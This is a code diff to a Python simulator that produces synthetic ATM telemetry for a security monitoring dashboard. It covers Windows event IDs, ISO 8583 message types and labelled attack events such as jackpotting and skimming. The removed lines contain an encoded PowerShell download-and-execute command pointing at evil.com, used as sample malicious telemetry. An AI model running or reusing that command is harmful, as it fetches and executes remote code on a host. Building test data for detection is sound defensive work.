@@ -1,3 +1,9 @@
+"""
+This simulator generates synthetic ATM endpoint telemetry.
+Based on real Windows Event Log structure from ATMs running Windows 10 IoT Enterprise.
+Transaction messages follow ISO 8583 financial messaging standard.
+XFS (eXtensions for Financial Services) is the real middleware standard used by all ATM vendors.
+"""
 import asyncio
 import random
 import time
@@ -6,51 +12,88 @@ from src.backend.connection_manager import manager
 from src.backend.playbooks import evaluate_playbooks
 
 async def run_endpoint_simulator():
-    """
-    Simulates Windows Host Events (Event ID 4688, 11, etc.)
-    and pushes them via websocket.
-    """
     while True:
         await asyncio.sleep(random.uniform(3.0, 10.0))
         
-        event_types = ["ProcessCreation", "FileCreate", "UEBA_Anomaly"]
-        chosen = random.choice(event_types)
+        event_category = random.choices(["WindowsEvent", "ISO8583", "Attack"], weights=[0.5, 0.4, 0.1])[0]
         
         atm_id = random.choice(["ATM-01", "ATM-02", "ATM-03", "ATM-04", "ATM-99-HONEYPOT"])
-        host_ip = f"192.168.1.10{atm_id[-1]}"
+        # Give honeypot a distinct IP, or use the last digit of regular ATM IDs
+        host_ip = f"192.168.1.10{atm_id[-1]}" if atm_id != "ATM-99-HONEYPOT" else "192.168.1.109"
         event_data = {
             "timestamp": int(time.time() * 1000),
             "host_ip": host_ip
         }
+        cmd = ""
 
-        if chosen == "ProcessCreation":
-            # 30% chance of being malicious powershell
-            if random.random() < 0.3:
-                b64_payload = base64.b64encode(b"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')").decode()
-                cmd = f"powershell.exe -enc {b64_payload}"
-            else:
-                cmds = ["C:\\Windows\\System32\\svchost.exe -k netsvcs", "C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\cmd.exe /c echo hello"]
-                cmd = random.choice(cmds)
-
+        if event_category == "WindowsEvent":
+            event_id = random.choice([4688, 4624, 7036, 1102])
+            if event_id == 4688:
+                cmds = [
+                    "C:\\Program Files\\Diebold\\Agilis\\XFSManager.exe",
+                    "C:\\Program Files\\NCR\\APTRA\\CashDispenser.exe",
+                    "C:\\Wincor\\ProCash\\ProCash.exe",
+                    "C:\\Windows\\System32\\svchost.exe -k XFSService"
+                ]
+                proc = random.choice(cmds)
+                cmd = f"Process Creation: {proc}"
+                event_data.update({
+                    "event_id": 4688,
+                    "process_name": proc.split("\\")[-1],
+                    "command_line": proc
+                })
+            elif event_id == 4624:
+                cmd = "Logon Event: Technician/Remote Admin"
+                event_data.update({
+                    "event_id": 4624,
+                    "logon_type": random.choice([2, 10]),
+                    "account_name": "ATM_Admin"
+                })
+            elif event_id == 7036:
+                cmd = "Service Status Change: XFS Service"
+                event_data.update({
+                    "event_id": 7036,
+                    "service_name": "XFSService",
+                    "state": random.choice(["running", "stopped"])
+                })
+            elif event_id == 1102:
+                cmd = "Audit Log Cleared"
+                event_data.update({
+                    "event_id": 1102,
+                    "message": "The audit log was cleared"
+                })
+                
+        elif event_category == "ISO8583":
+            iso_type = random.choice(["0200", "0400", "0800", "0100"])
+            iso_desc = {
+                "0200": "Financial Transaction Request (cash withdrawal)",
+                "0400": "Reversal Request",
+                "0800": "Network Management (health check/keep-alive)",
+                "0100": "Authorization Request"
+            }
+            cmd = f"ISO 8583: {iso_type} - {iso_desc[iso_type]}"
             event_data.update({
-                "event_id": 4688,
-                "process_name": cmd.split()[0],
-                "command_line": cmd
+                "message_type": iso_type,
+                "description": iso_desc[iso_type],
+                "amount": random.choice([20, 50, 100, 200]) if iso_type in ["0200", "0100"] else 0
             })
-        elif chosen == "FileCreate":
-            cmd = f"FileCreate C:\\Windows\\Temp\\random_{random.randint(1000, 9999)}.tmp"
-            event_data.update({
-                "event_id": 11,
-                "file_name": f"C:\\Windows\\Temp\\random_{random.randint(1000, 9999)}.tmp",
-                "command_line": cmd
-            })
-        else:
-            cmd = "UEBA Anomaly Login"
-            event_data.update({
-                "event_id": 4624,
-                "message": "Admin login outside business hours",
-                "risk_score": 95
-            })
+            
+        elif event_category == "Attack":
+            attack_type = random.choice([
+                "Jackpotting", 
+                "Black Box Attack", 
+                "Skimmer Detected", 
+                "Man-in-the-Middle"
+            ])
+            cmd = f"ATTACK SIMULATION: {attack_type}"
+            if attack_type == "Jackpotting":
+                event_data.update({"attack": attack_type, "details": "Unauthorized cash dispensing via malicious XFS commands"})
+            elif attack_type == "Black Box Attack":
+                event_data.update({"attack": attack_type, "details": "External device sending raw XFS commands"})
+            elif attack_type == "Skimmer Detected":
+                event_data.update({"attack": attack_type, "details": "Unusual USB device enumeration"})
+            elif attack_type == "Man-in-the-Middle":
+                event_data.update({"attack": attack_type, "details": "TLS certificate mismatch on host-to-host connection"})
 
         payload = {
             "type": "endpoint_event",
